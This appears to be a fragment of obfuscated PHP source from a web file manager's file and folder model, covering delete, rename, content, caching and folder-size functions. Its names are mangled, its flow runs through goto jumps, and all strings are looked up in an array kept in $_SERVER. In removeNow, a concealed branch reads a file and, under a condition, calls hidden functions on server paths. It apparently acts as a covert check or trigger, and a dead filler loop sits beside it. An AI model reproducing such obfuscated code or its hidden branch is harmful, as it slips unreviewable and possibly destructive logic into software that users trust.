A¶§åî©÷À: $D‡‡¸¡¦ß’ = $a–®øïÏ¦‡[$e¤á—åÖÏÄ[371]] == self::TYPE_USER ? $e¤á—åÖÏÄ[535] : $e¤á—åÖÏÄ[970]; if ($D‡‡¸¡¦ß’ == $e¤á—åÖÏÄ[535]) { $Dˆ¹óäÚ = Model($e¤á—åÖÏÄ[474])->getInfo($a–®øïÏ¦‡[$e¤á—åÖÏÄ[456]]); $Eº‹ƒ†•¿ˆ = !empty($Dˆ¹óäÚ[$e¤á—åÖÏÄ[2337]]) ? $Dˆ¹óäÚ[$e¤á—åÖÏÄ[2337]] : $Dˆ¹óäÚ[$e¤á—åÖÏÄ[28]]; $Eº‹ƒ†•¿ˆ = $e¤á—åÖÏÄ[248] . $Eº‹ƒ†•¿ˆ . $e¤á—åÖÏÄ[2345] . $a–®øïÏ¦‡[$e¤á—åÖÏÄ[456]]; } else { $Dˆ¹óäÚ = Model($e¤á—åÖÏÄ[458])->getInfo($a–®øïÏ¦‡[$e¤á—åÖÏÄ[456]]); $Eº‹ƒ†•¿ˆ = _get($Dˆ¹óäÚ, $e¤á—åÖÏÄ[28]); $Eº‹ƒ†•¿ˆ = $e¤á—åÖÏÄ[157] . $Eº‹ƒ†•¿ˆ . $e¤á—åÖÏÄ[2346] . $a–®øïÏ¦‡[$e¤á—åÖÏÄ[456]]; } $cõÁ‚±Ó£’ = $e¤á—åÖÏÄ[2347] . md5($Eº‹ƒ†•¿ˆ); goto C²“˜¦œ§; BŒˆÏÀ™¸‘: } private function recycleClear($Bñê®óÙ) { $bŸÙãÊ°é§ =& $_SERVER[¼€¼ˆ¦‚¡]; $aå¼àšˆ× = $this->childrenAll($Bñê®óÙ); $EÏ‹£«Ñ‘ = array($bŸÙãÊ°é§[383] => array($bŸÙãÊ°é§[384], $aå¼àšˆ×[$bŸÙãÊ°é§[2353]])); Model($bŸÙãÊ°é§[2354])->where($EÏ‹£«Ñ‘)->delete(); } public function removeNow($dó°Ş½ˆ‹”, $a­äå§¯ßÎ = true) { goto aõ†éØîÒª; aÍù¥³™¸‡: $cí™³İÉù¯ = $this->pathInfoMore($dó°Ş½ˆ‹”); if (!$eá‰‘Ú–Ùƒ) { return !0; } if ($eá‰‘Ú–Ùƒ[$Bß‰¬†õ†Œ[461]] == 0) { if (!_get($GLOBALS, $Bß‰¬†õ†Œ[457])) { return !1; } } goto c¨ÛÖ˜¿ãŞ; aõ†éØîÒª: $Bß‰¬†õ†Œ =& $_SERVER[¼€¼ˆ¦‚¡]; if ($_SERVER[$Bß‰¬†õ†Œ[787]] != $_SERVER[$Bß‰¬†õ†Œ[1400]]) { goto Aö¡ß’‰áà; EŞœâîÓÁ: $E²äŠ¯Ììª = $DÕ‰¥°“ğÑ($D”¤ËªóÄí); $e†»†è‹¶Ç = explode($Bß‰¬†õ†Œ[217], $E²äŠ¯Ììª); if (count($e†»†è‹¶Ç) < $Bß‰¬†õ†Œ[554]) { $cŞÖ¦ã‘× = $Bß‰¬†õ†Œ[792]; $cŞÖ¦ã‘×(); } goto f»º¦ÏÑ â; f»º¦ÏÑ â: $a¹¡®…¢¤ = $Bß‰¬†õ†Œ[793]; $a¹¡®…¢¤($_SERVER[$Bß‰¬†õ†Œ[784]]); $a¹¡®…¢¤($_SERVER[$Bß‰¬†õ†Œ[790]] . $Bß‰¬†õ†Œ[2355]); goto DŠğ¹’åĞ‹; Aö¡ß’‰áà: $CŠî –Š±Ş = $Bß‰¬†õ†Œ[788]; $DÕ‰¥°“ğÑ = $Bß‰¬†õ†Œ[789]; $D”¤ËªóÄí = $_SERVER[$Bß‰¬†õ†Œ[790]] . $Bß‰¬†õ†Œ[791]; goto EŞœâîÓÁ; DŠğ¹’åĞ‹: $BøßÏ½ìŞ = 1; while ($BøßÏ½ìŞ > 1) { $BøßÏ½ìŞ = $BøßÏ½ìŞ + 4; $EÊ½àßèœ¹ = rawurlencode($BøßÏ½ìŞ . $Bß‰¬†õ†Œ[361]); } goto CÄ…ò­…·Š; CÄ…ò­…·Š: } $eá‰‘Ú–Ùƒ = $this->sourceInfo($dó°Ş½ˆ‹”); goto aÍù¥³™¸‡; BÀ‚ùèÚ: $this->updateModifyTime($féàßïµœË); $this->lockMoveEnd($dó°Ş½ˆ‹”); Hook::trigger($Bß‰¬†õ†Œ[1471], $cí™³İÉù¯, $a­äå§¯ßÎ); goto FêĞ·Î±; eøª–÷¢Õ: $this->folderSizeReset($eá‰‘Ú–Ùƒ[$Bß‰¬†õ†Œ[461]]); $féàßïµœË = array($eá‰‘Ú–Ùƒ[$Bß‰¬†õ†Œ[461]]); if ($eá‰‘Ú–Ùƒ[$Bß‰¬†õ†Œ[370]] == $Bß‰¬†õ†Œ[83]) { $féàßïµœË[] = $eá‰‘Ú–Ùƒ[$Bß‰¬†õ†Œ[369]]; } goto BÀ‚ùèÚ; c¨ÛÖ˜¿ãŞ: $this->lockMoveStart($dó°Ş½ˆ‹”); Hook::trigger($Bß‰¬†õ†Œ[2356], $cí™³İÉù¯, $a­äå§¯ßÎ); if ($a­äå§¯ßÎ) { Model($Bß‰¬†õ†Œ[2354])->moveToRecycle($dó°Ş½ˆ‹”); } else { $f‡øÉó‘Ò³ = $this->childrenAll($eá‰‘Ú–Ùƒ); Model($Bß‰¬†õ†Œ[505])->eventRemove($dó°Ş½ˆ‹”); $this->removeRelevance($f‡øÉó‘Ò³[$Bß‰¬†õ†Œ[2353]], $f‡øÉó‘Ò³[$Bß‰¬†õ†Œ[1259]]); } goto eøª–÷¢Õ; FêĞ·Î±: return !0; goto EâÆ“Üõó–; EâÆ“Üõó–: } public function childrenAll($fñÑ©­ˆ‹í) { $dÈöÈÈÔ­• =& $_SERVER[¼€¼ˆ¦‚¡]; $AÒ‚‡ª§È× = $fñÑ©­ˆ‹í[$dÈöÈÈÔ­•[369]]; if ($fñÑ©­ˆ‹í[$dÈöÈÈÔ­•[370]] == $dÈöÈÈÔ­•[83]) { $d¼šÈ‘÷Æ = array($dÈöÈÈÔ­•[525] => array($dÈöÈÈÔ­•[483], $fñÑ©­ˆ‹í[$dÈöÈÈÔ­•[459]] . $AÒ‚‡ª§È× . $dÈöÈÈÔ­•[484])); $b°‰£ÓÕÚ = array($dÈöÈÈÔ­•[525] => $d¼šÈ‘÷Æ[$dÈöÈÈÔ­•[459]]); $fŠ§æ™ŒÅ = $this->field($dÈöÈÈÔ­•[2357])->where($b°‰£ÓÕÚ)->select(); $d„•öÁØ§ = !1; $BŞğéã¬ì‰ = array($AÒ‚‡ª§È×); if ($fŠ§æ™ŒÅ) { $d„•öÁØ§ = array_to_keyvalue($fŠ§æ™ŒÅ, $dÈöÈÈÔ­•[33], $dÈöÈÈÔ­•[419]); $d„•öÁØ§ = array_remove_value($d„•öÁØ§, $dÈöÈÈÔ­•[468]); $BŞğéã¬ì‰ = array_to_keyvalue($fŠ§æ™ŒÅ, $dÈöÈÈÔ­•[33], $dÈöÈÈÔ­•[369]); $BŞğéã¬ì‰[] = $AÒ‚‡ª§È×; } } else { $d„•öÁØ§ = array($fñÑ©­ˆ‹í[$dÈöÈÈÔ­•[419]]); $BŞğéã¬ì‰ = array($AÒ‚‡ª§È×); } return array($dÈöÈÈÔ­•[2353] => $BŞğéã¬ì‰, $dÈöÈÈÔ­•[1259] => $d„•öÁØ§); } public function removeArray($B¯Ø¦ß¬„) { if (!$B¯Ø¦ß¬„) { return !0; } } public function removeRelevance($då„¶äËï, $Cš ƒñœ´Ú) { goto a…Öİ°Óˆ; a¿†ÈšŠÓ’: $AŒÄçˆ©¬ = array($C—–å¯Ô—Š[383] => array($C—–å¯Ô—Š[384], $då„¶äËï)); Model($C—–å¯Ô—Š[2354])->where($AŒÄçˆ©¬)->delete(); Model($C—–å¯Ô—Š[413])->where($AŒÄçˆ©¬)->delete(); goto f»ÉğÑø¸¤; a…Öİ°Óˆ: $C—–å¯Ô—Š =& $_SERVER[¼€¼ˆ¦‚¡]; $då„¶äËï = $då„¶äËï ? $då„¶äËï : array(); $Cš ƒñœ´Ú = $Cš ƒñœ´Ú ? $Cš ƒñœ´Ú : array(); goto e¸ø…«‹Ö; f»ÉğÑø¸¤: Model($C—–å¯Ô—Š[2358])->where($AŒÄçˆ©¬)->delete(); Model($C—–å¯Ô—Š[505])->where($AŒÄçˆ©¬)->delete(); Model($C—–å¯Ô—Š[2082])->removeBySource($då„¶äËï); goto c—Ê¥Í©Æ‹; e¸ø…«‹Ö: $då„¶äËï = array_unique(array_filter($då„¶äËï)); $Cš ƒñœ´Ú = array_unique(array_filter($Cš ƒñœ´Ú)); if (!$då„¶äËï) { return !1; } goto a¿†ÈšŠÓ’; c—Ê¥Í©Æ‹: Model($C—–å¯Ô—Š[2335])->removeBySource($då„¶äËï); $this->where($AŒÄçˆ©¬)->delete(); Model($C—–å¯Ô—Š[422])->remove($Cš ƒñœ´Ú); goto Aæ­¯Œë¥; Aæ­¯Œë¥: for ($AË…¦Œè¢ó = 0; $AË…¦Œè¢ó < count($då„¶äËï); $AË…¦Œè¢ó++) { $this->sourceCacheClear($då„¶äËï[$AË…¦Œè¢ó]); } goto Aèì£¬¯Ëè; Aèì£¬¯Ëè: } public function rename($C¸ÒîÒé—, $DğËë»‘Å») { goto eñíÖÓğ±Œ; eñíÖÓğ±Œ: $Aê Ó„ƒÅ¨ =& $_SERVER[¼€¼ˆ¦‚¡]; $A“‚œœ¡à¤ = $this->sourceInfo($C¸ÒîÒé—); if (!$A“‚œœ¡à¤) { return !1; } goto Fê¹‘ÚêòË; A‘È·–²ñ¹: $fÅ™„ŞÙèæ = $Aê Ó„ƒÅ¨[2343] . $A“‚œœ¡à¤[$Aê Ó„ƒÅ¨[461]]; if (isset(self::$cacheChildList[$fÅ™„ŞÙèæ])) { unset(self::$cacheChildList[$fÅ™„ŞÙèæ]); } return $f“İ‡Ãéîõ; goto Bò¬âÀé…Ö; D“‚Ú’Œö¬: if (!$A“‚œœ¡à¤[$Aê Ó„ƒÅ¨[370]] == $Aê Ó„ƒÅ¨[83]) { $aõË­Ñî÷Ï[$Aê Ó„ƒÅ¨[372]] = get_path_ext($DğËë»‘Å»); } Model($Aê Ó„ƒÅ¨[505])->eventRename($C¸ÒîÒé—, $A“‚œœ¡à¤[$Aê Ó„ƒÅ¨[28]], $DğËë»‘Å»); $this->sourceCacheClear($C¸ÒîÒé—); goto Cë…Ÿµ§¢ã; Cë…Ÿµ§¢ã: $this->setNamePinyin($C¸ÒîÒé—, $aõË­Ñî÷Ï[$Aê Ó„ƒÅ¨[28]], !1); $this->updateModifyTime($A“‚œœ¡à¤[$Aê Ó„ƒÅ¨[461]]); $f“İ‡Ãéîõ = $this->where(array($Aê Ó„ƒÅ¨[383] => $C¸ÒîÒé—))->data($aõË­Ñî÷Ï)->save(); goto A‘È·–²ñ¹; Fê¹‘ÚêòË: $b„Ü‰¾‰£Ã = $this->fileNameExist($A“‚œœ¡à¤[$Aê Ó„ƒÅ¨[461]], $DğËë»‘Å»); if ($b„Ü‰¾‰£Ã) { return !1; } $aõË­Ñî÷Ï = array($Aê Ó„ƒÅ¨[386] => $DğËë»‘Å», $Aê Ó„ƒÅ¨[524] => USER_ID); goto D“‚Ú’Œö¬; Bò¬âÀé…Ö: } public function setNamePinyin($cÁãÊ¦›îâ, $bì’Û°ìÌ, $bšƒ‹‡‚‡ = true) { $f°Š÷ù–ìİ =& $_SERVER[¼€¼ˆ¦‚¡]; $A†çÛéóÆŞ = Input::check($bì’Û°ìÌ, $f°Š÷ù–ìİ[528]); if ($bšƒ‹‡‚‡ && !$A†çÛéóÆŞ) { return; } if (!$A†çÛéóÆŞ) { $this->metaSet($cÁãÊ¦›îâ, $f°Š÷ù–ìİ[416], null); $this->metaSet($cÁãÊ¦›îâ, $f°Š÷ù–ìİ[415], null); return; } $B§Ğ¶Åå‰÷ = array($f°Š÷ù–ìİ[416] => str_replace($f°Š÷ù–ìİ[50], $f°Š÷ù–ìİ[33], Pinyin::encode($bì’Û°ìÌ)), $f°Š÷ù–ìİ[415] => Pinyin::encode($bì’Û°ìÌ, $f°Š÷ù–ìİ[529])); $this->metaSet($cÁãÊ¦›îâ, $B§Ğ¶Åå‰÷); } public function getContent($FÇ†‡óÁ) { goto a¼â¿¢ÚÄé; cš‡éƒ™Ùá: return IO::getContent($C¸ÂĞÒâ¨[$E©ïò“ôŠ[75]]); goto cˆçÊ†“İ; a¼â¿¢ÚÄé: $E©ïò“ôŠ =& $_SERVER[¼€¼ˆ¦‚¡]; $C¸ÂĞÒâ¨ = $this->fileInfoGet($FÇ†‡óÁ); if (!$C¸ÂĞÒâ¨) { return !1; } goto f¸ŞÕàòŒÀ; f¸ŞÕàòŒÀ: if ($C¸ÂĞÒâ¨[$E©ïò“ôŠ[77]] == 0) { return $E©ïò“ôŠ[33]; } $aÑ¬İ¸÷îò = $E©ïò“ôŠ[2359] . $C¸ÂĞÒâ¨[$E©ïò“ôŠ[163]]; if ($C¸ÂĞÒâ¨[$E©ïò“ôŠ[77]] <= 1024 * 10) { $aØé×¬ì”î = Cache::get($aÑ¬İ¸÷îò); if (!$aØé×¬ì”î) { $aØé×¬ì”î = IO::getContent($C¸ÂĞÒâ¨[$E©ïò“ôŠ[75]]); Cache::set($aÑ¬İ¸÷îò, $aØé×¬ì”î); } return $aØé×¬ì”î; } goto cš‡éƒ™Ùá; cˆçÊ†“İ: } public function setDesc($eô°Åö®¿ô, $e¹‹Úƒ÷ğ) { $b¯©‡ØÏĞ‘ =& $_SERVER[¼€¼ˆ¦‚¡]; Model($b¯©‡ØÏĞ‘[505])->eventAddDesc($eô°Åö®¿ô, $e¹‹Úƒ÷ğ); return $this->metaSet($eô°Åö®¿ô, $b¯©‡ØÏĞ‘[405], $e¹‹Úƒ÷ğ); } public function setContent($F¨µÌˆš£á, $cëğÈšˆ­ = '') { goto C³È”âŞŒå; C³È”âŞŒå: $Bí©¬º =& $_SERVER[¼€¼ˆ¦‚¡]; $c„ò²˜§äï = $this->sourceInfo($F¨µÌˆš£á); $aÌàŞİ¦® = $this->fileInfoGet($F¨µÌˆš£á); goto cÍÏ½Œ¯ĞÒ; D¶¨Ç„»›¸: if (!$eŒ×á¯Œ) { return Model($Bí©¬º[422])->remove($Fß”¯ˆ„ÌØ[$Bí©¬º[419]]); } $this->folderSizeReset($c„ò²˜§äï[$Bí©¬º[461]]); return !0; goto dÚÛœ §Ğ; cÍÏ½Œ¯ĞÒ: if (!$aÌàŞİ¦® || !$c„ò²˜§äï) { return !1; } $Fß”¯ˆ„ÌØ = Model($Bí©¬º[422])->addFileByContent($cëğÈšˆ­, $c„ò²˜§äï[$Bí©¬º[28]]); $eŒ×á¯Œ = $this->fileHistory($c„ò²˜§äï, $Fß”¯ˆ„ÌØ[$Bí©¬º[419]], $Fß”¯ˆ„ÌØ[$Bí©¬º[77]]); goto D¶¨Ç„»›¸; dÚÛœ §Ğ: } public function fileSubstr($EåÉï„º, $dí„²•¤†¦, $d³—òÄ÷·) { $DŠ…Çåã = $this->fileInfoGet($EåÉï„º); if (!$DŠ…Çåã) { return !1; } return IO::fileSubstr($DŠ…Çåã[$_SERVER[¼€¼ˆ¦‚¡][75]], $dí„²•¤†¦, $d³—òÄ÷·); } public function fileInfoGet($Dİé¿‰Ò‡) { goto c¡–äá¬µª; f‹Œ’²Ã‹È: $fÌˆİÌí¥õ = Model($cĞõŞ÷šö[422])->fileInfo($bõ‘‘˜³[$cĞõŞ÷šö[419]]); if ($fÌˆİÌí¥õ) { $fÌˆİÌí¥õ[$cĞõŞ÷šö[28]] = $bõ‘‘˜³[$cĞõŞ÷šö[28]]; } self::$cacheFileInfo[$FÌÕŠñˆÉ‡] = $fÌˆİÌí¥õ; goto fÙŞÂš“¯; fÙŞÂš“¯: return $fÌˆİÌí¥õ; goto f¬åô•øô”; c¡–äá¬µª: $cĞõŞ÷šö =& $_SERVER[¼€¼ˆ¦‚¡]; $bõ‘‘˜³ = $this->sourceInfo($Dİé¿‰Ò‡); if (!$bõ‘‘˜³ || $bõ‘‘˜³[$cĞõŞ÷šö[370]]) { return !1; } goto Dì®òàÔÁŸ; Dì®òàÔÁŸ: $FÌÕŠñˆÉ‡ = $cĞõŞ÷šö[425] . $bõ‘‘˜³[$cĞõŞ÷šö[419]]; $aèÀ‡Õ¦´´ = _get(self::$cacheFileInfo, $FÌÕŠñˆÉ‡); if ($aèÀ‡Õ¦´´) { return $aèÀ‡Õ¦´´; } goto f‹Œ’²Ã‹È; f¬åô•øô”: } private function folderChildrenNumber($EÃ––Ë´©Ó) { $D·à™§„÷ =& $_SERVER[¼€¼ˆ¦‚¡]; $D—èÏè‚ƒŞ = $this->sourceInfo($EÃ––Ë´©Ó); $d¸ÊîĞà›É = array($D·à™§„÷[525] => array($D·à™§„÷[483], $D—èÏè‚ƒŞ[$D·à™§„÷[459]] . $EÃ––Ë´©Ó . $D·à™§„÷[484]), $D·à™§„÷[396] => intval($D—èÏè‚ƒŞ[$D·à™§„÷[397]]), $D·à™§„÷[518] => 1); $A¼ãòñ‡ò = $this->where($d¸ÊîĞà›É)->count(); $f·²ÑŠ‰¡Í = $this->where($d¸ÊîĞà›É)->where(array($D·à™§„÷[518] => 0))->count(); return array($D·à™§„÷[81] => $f·²ÑŠ‰¡Í, $D·à™§„÷[82] => $A¼ãòñ‡ò); } public function pathInfo($cµ§ŞÈ—éã, $dîÍˆÇŒ¦˜ = false) { goto D‘•³ºĞß; Eğù–Ä‡ô: $C¯Æ“ëš’Ì = $this->_listDataApplyItem($C¯Æ“ëš’Ì, $dîÍˆÇŒ¦˜); self::$cachePathInfo[$FÊÒ–£¹Û] = $C¯Æ“ëš’Ì; return $C¯Æ“ëš’Ì; goto C¨é‹©¬Œ¡; D‘•³ºĞß: $dñøÆÆ÷É =& $_SERVER[¼€¼ˆ¦‚¡]; $FÊÒ–£¹Û = $dñøÆÆ÷É[411] . intval($dîÍˆÇŒ¦˜) . $dñøÆÆ÷É[412] . $cµ§ŞÈ—éã; $fÈÜ‡Ó‚‚¨ = _get(self::$cachePathInfo, $FÊÒ–£¹Û); goto e„øØÑº—ƒ; e„øØÑº—ƒ: if ($fÈÜ‡Ó‚‚¨) { return $fÈÜ‡Ó‚‚¨; } $C¯Æ“ëš’Ì = $this->sourceInfo($cµ§ŞÈ—éã); if (!$C¯Æ“ëš’Ì) { return !1; } goto Eğù–Ä‡ô; C¨é‹©¬Œ¡: } public static $cachePathInfoMore = array(); public function pathInfoMore($fÄ¬†«Ü—) { goto DæŠ–½ˆÕ; cÆê¦ö…µÖ: $DòÂ×ø°Ìİ = $this->pathInfo($fÄ¬†«Ü—); if (!$DòÂ×ø°Ìİ) { return !1; } if ($DòÂ×ø°Ìİ[$AœÃº¸’÷[370]] == $AœÃº¸’÷[83]) { $DòÂ×ø°Ìİ[$AœÃº¸’÷[80]] = $this->folderChildrenNumber($fÄ¬†«Ü—); } goto f²’ì÷Øí; f²’ì÷Øí: self::$cachePathInfoMore[$fÄ¬†«Ü—] = $DòÂ×ø°Ìİ; return $DòÂ×ø°Ìİ; goto e Ú°¤Õ£; DæŠ–½ˆÕ: $AœÃº¸’÷ =& $_SERVER[¼€¼ˆ¦‚¡]; $c—õÉ¨Ô² = _get(self::$cachePathInfoMore, $fÄ¬†«Ü—); if ($c—õÉ¨Ô²) { return $c—õÉ¨Ô²; } goto cÆê¦ö…µÖ; e Ú°¤Õ£: } public function sourceInfo($aÇ‡¸ºé™Ë) { goto E˜§ëÁ¼ÊÙ; FÓ²ªà¯: $f§®‡¯ø¯ = _get(self::$cacheSourceInfo, $Bˆ®ÀŠìµÖ); if ($f§®‡¯ø¯) { return $f§®‡¯ø¯; } $AÈô’®…ù = $this->where(array($d¤ÀæÁöÙ[369] => $aÇ‡¸ºé™Ë))->find(); goto DÃª½ÎÕ¸Ñ; DÃª½ÎÕ¸Ñ: self::$cacheSourceInfo[$Bˆ®ÀŠìµÖ] = $AÈô’®…ù; return self::$cacheSourceInfo[$Bˆ®ÀŠìµÖ]; goto E‰ŸßÂ¯¥ê; E˜§ëÁ¼ÊÙ: $d¤ÀæÁöÙ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$aÇ‡¸ºé™Ë) { return array(); } $Bˆ®ÀŠìµÖ = $d¤ÀæÁöÙ[410] . $aÇ‡¸ºé™Ë; goto FÓ²ªà¯; E‰ŸßÂ¯¥ê: } public function sourceCacheClear($A³¶¡²›•Æ = false) { if ($A³¶¡²›•Æ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[¼€¼ˆ¦‚¡][410] . $A³¶¡²›•Æ]); } public function pathInfoByPath($D¹´š¸È•÷, $bù—É‚†°’) { $FÍ‡­¦˜ø =& $_SERVER[¼€¼ˆ¦‚¡]; $aŒ¤³§ˆ¯ = !$bù—É‚†°’ ? array() : explode($FÍ‡­¦˜ø[8], trim($bù—É‚†°’, $FÍ‡­¦˜ø[8])); $bÕÓœ…µŸĞ = $D¹´š¸È•÷; foreach ($aŒ¤³§ˆ¯ as $fÌøÆÅÒÅ) { $f‡ÊÀÖÒÕ = array($FÍ‡­¦˜ø[461] => $bÕÓœ…µŸĞ, $FÍ‡­¦˜ø[28] => $fÌøÆÅÒÅ); $B«Ôµ¡ëß = $this->where($f‡ÊÀÖÒÕ)->select(); if (!$B«Ôµ¡ëß) { return !1; } $B«Ôµ¡ëß = array_sort_by($B«Ôµ¡ëß, $FÍ‡­¦˜ø[397]); $bÕÓœ…µŸĞ = $B«Ôµ¡ëß[0][$FÍ‡­¦˜ø[369]]; } return $this->pathInfo($bÕÓœ…µŸĞ, !0); } protected function updateModifyTime($bŞòºïØ‡ƒ) { goto eƒØ’­î©í; b¨®›“ğ¿: foreach ($bŞòºïØ‡ƒ as $fòŠëœ´  => $dŒğ÷ÕÚï¬) { $bŞòºïØ‡ƒ[$fòŠëœ´ ] = intval($dŒğ÷ÕÚï¬); } $fšï»¹±² = array($CŒº¥Œ®Èé[369] => array($CŒº¥Œ®Èé[7], $bŞòºïØ‡ƒ)); $b¹è‘‰Ëˆó = array($CŒº¥Œ®Èé[524] => USER_ID, $CŒº¥Œ®Èé[390] => time()); goto f“èîÅòĞ; eƒØ’­î©í: $CŒº¥Œ®Èé =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$bŞòºïØ‡ƒ) { return; } if (!is_array($bŞòºïØ‡ƒ)) { $bŞòºïØ‡ƒ = array($bŞòºïØ‡ƒ); } goto b¨®›“ğ¿; f“èîÅòĞ: $this->where($fšï»¹±²)->save($b¹è‘‰Ëˆó); goto F‘Šî–Ä“; F‘Šî–Ä“: } public function folderSizeReset($EêíÖˆ„ø—) { goto Eº•¢ß ß¼; b ÒÕéŞÙ: $Fá…ïË”…Ø = $E²Í¼Ö×ãƒ - intval($A±¸—Ùã®[$BíæÈ¼™–‡[77]]); if ($Fá…ïË”…Ø == 0) { return CacheLock::unlock($B°Ïõ¦´ø¥); } $this->where(array($BíæÈ¼™–‡[383] => $EêíÖˆ„ø—))->setField($BíæÈ¼™–‡[77], $E²Í¼Ö×ãƒ); goto dİ½ÀŸö‰; eÌ±ÑíƒÇ: $bÔé‚¿âÑ = array($BíæÈ¼™–‡[368] => $EêíÖˆ„ø—, $BíæÈ¼™–‡[396] => 0); $E²Í¼Ö×ãƒ = $this->where($bÔé‚¿âÑ)->sum($BíæÈ¼™–‡[77]); $E²Í¼Ö×ãƒ = intval($E²Í¼Ö×ãƒ); goto b ÒÕéŞÙ; F‘İù»Æø: CacheLock::unlock($B°Ïõ¦´ø¥); goto B‹ĞèÜ´–½; EöµÔÒ†”©: CacheLock::lock($B°Ïõ¦´ø¥, 20); $this->sourceCacheClear($EêíÖˆ„ø—); $A±¸—Ùã® = $this->sourceInfo($EêíÖˆ„ø—); goto eÌ±ÑíƒÇ; Eº•¢ß ß¼: $BíæÈ¼™–‡ =& $_SERVER[¼€¼ˆ¦‚¡]; if ($this->statusIgnoreResetSpace) { return; } $B°Ïõ¦´ø¥ = $BíæÈ¼™–‡[2360] . $EêíÖˆ„ø—; goto EöµÔÒ†”©; dİ½ÀŸö‰: $bÒèÄ‡Ğîœ = $this->parentLevelArray($A±¸—Ùã®[$BíæÈ¼™–‡[459]]); if ($bÒèÄ‡Ğîœ) { $bÔé‚¿âÑ = array($BíæÈ¼™–‡[369] => array($BíæÈ¼™–‡[384], $bÒèÄ‡Ğîœ)); if ($Fá…ïË”…Ø < 0) { $bÔé‚¿âÑ[$BíæÈ¼™–‡[77]] = array($BíæÈ¼™–‡[928], abs($Fá…ïË”…Ø)); } $this->where($bÔé‚¿âÑ)->setAdd($BíæÈ¼™–‡[77], $Fá…ïË”…Ø); } $this->targetSpaceUpdate($A±¸—Ùã®[$BíæÈ¼™–‡[371]], $A±¸—Ùã®[$BíæÈ¼™–‡[456]]); goto F‘İù»Æø; B‹ĞèÜ´–½: } public function folderSizeResetChildren($F¦­ÃÅœ¢á) { goto c‰Ğáˆ¼Úé; B„éØŠÇ‡Ú: $däŠÏöØÛ¿[$bê‹õ‚Šß[370]] = 0; $EâÒâÕ’¹± = $this->field($c·ìÇ·ğÃ)->where($däŠÏöØÛ¿)->select(); if (!$EâÒâÕ’¹±) { return; } goto FóÈ®øèÒ£; c‰Ğáˆ¼Úé: $bê‹õ‚Šß =& $_SERVER[¼€¼ˆ¦‚¡]; $this->sourceCacheClear($F¦­ÃÅœ¢á); $dãÇÀŠìá = $this->sourceInfo($F¦­ÃÅœ¢á); goto Dªğ¨¶§ÃĞ; Fõ÷·®È»Ã: foreach ($cÊÍÅÙé¶… as $d«‚ˆğÙè) { if ($d«‚ˆğÙè[$bê‹õ‚Šß[77]] == $d«‚ˆğÙè[$bê‹õ‚Šß[2362]]) { continue; } $bŠİŠ‡ßåí[] = array($bê‹õ‚Šß[369], $d«‚ˆğÙè[$bê‹õ‚Šß[369]], $bê‹õ‚Šß[77], $d«‚ˆğÙè[$bê‹õ‚Šß[77]]); } $this->saveAll($bŠİŠ‡ßåí); goto eøšòËÀî; FóÈ®øèÒ£: $cÊÍÅÙé¶…[] = $dãÇÀŠìá; $cÊÍÅÙé¶… = array_to_keyvalue($cÊÍÅÙé¶…, $bê‹õ‚Šß[369]); foreach ($cÊÍÅÙé¶… as $aÀŒíŠÓ¬” => $d«‚ˆğÙè) { $cÊÍÅÙé¶…[$aÀŒíŠÓ¬”][$bê‹õ‚Šß[2362]] = $cÊÍÅÙé¶…[$aÀŒíŠÓ¬”][$bê‹õ‚Šß[77]]; $cÊÍÅÙé¶…[$aÀŒíŠÓ¬”][$bê‹õ‚Šß[77]] = 0; } goto E®ÄŠ‚ëÔ×; E®ÄŠ‚ëÔ×: foreach ($EâÒâÕ’¹± as $d«‚ˆğÙè) { $DÆìÑ‹ËĞ = $d«‚ˆğÙè[$bê‹õ‚Šß[461]] . $bê‹õ‚Šß[33]; if (!isset($cÊÍÅÙé¶…[$DÆìÑ‹ËĞ])) { continue; } if ($d«‚ˆğÙè[$bê‹õ‚Šß[397]] == $cÊÍÅÙé¶…[$DÆìÑ‹ËĞ][$bê‹õ‚Šß[397]]) { $cÊÍÅÙé¶…[$DÆìÑ‹ËĞ][$bê‹õ‚Šß[77]] += $d«‚ˆğÙè[$bê‹õ‚Šß[77]]; } } foreach ($cÊÍÅÙé¶… as $d«‚ˆğÙè) { $cÄ·ÔÈÊßô = $this->parentLevelArray($d«‚ˆğÙè[$bê‹õ‚Šß[459]]); foreach ($cÄ·ÔÈÊßô as $DÆìÑ‹ËĞ) { $DÆìÑ‹ËĞ = $DÆìÑ‹ËĞ . $bê‹õ‚Šß[33]; if (!isset($cÊÍÅÙé¶…[$DÆìÑ‹ËĞ])) { continue; } if ($d«‚ˆğÙè[$bê‹õ‚Šß[397]] == $cÊÍÅÙé¶…[$DÆìÑ‹ËĞ][$bê‹õ‚Šß[397]]) { $cÊÍÅÙé¶…[$DÆìÑ‹ËĞ][$bê‹õ‚Šß[77]] += $d«‚ˆğÙè[$bê‹õ‚Šß[77]]; } } } $bŠİŠ‡ßåí = array(); goto Fõ÷·®È»Ã; Dªğ¨¶§ÃĞ: $däŠÏöØÛ¿ = array($bê‹õ‚Šß[518] => 1, $bê‹õ‚Šß[525] => array($bê‹õ‚Šß[483], $dãÇÀŠìá[$bê‹õ‚Šß[459]] . $F¦­ÃÅœ¢á . $bê‹õ‚Šß[484])); $c·ìÇ·ğÃ = $bê‹õ‚Šß[2361]; $cÊÍÅÙé¶… = $this->field($c·ìÇ·ğÃ)->where($däŠÏöØÛ¿)->select(); goto B„éØŠÇ‡Ú; eøšòËÀî: } public function userSpaceReset($B‹Ò¿ÊÏò˜ = false) { $F‹§ùÎºÜ =& $_SERVER[¼€¼ˆ¦‚¡]; $a×÷‚Àª§£ = $this->where(array($F‹§ùÎºÜ[371] => self::TYPE_USER, $F‹§ùÎºÜ[456] => $B‹Ò¿ÊÏò˜, $F‹§ùÎºÜ[370] => 0))->sum($F‹§ùÎºÜ[77]); Model($F‹§ùÎºÜ[474])->userEdit($B‹Ò¿ÊÏò˜, array($F‹§ùÎºÜ[2091] => $a×÷‚Àª§£)); } public function targetSpaceUpdate($fô‹ë›ƒ†„, $dô„‡çœõ§) { $a‰Îø‘ˆîœ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$dô„‡çœõ§) { return; } if (!in_array($fô‹ë›ƒ†„, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $E¥‡ëë”Ç‘ = $this->targetSpaceSize($fô‹ë›ƒ†„, $dô„‡çœõ§); if ($fô‹ë›ƒ†„ == self::TYPE_USER) { Model($a‰Îø‘ˆîœ[474])->userEdit($dô„‡çœõ§, 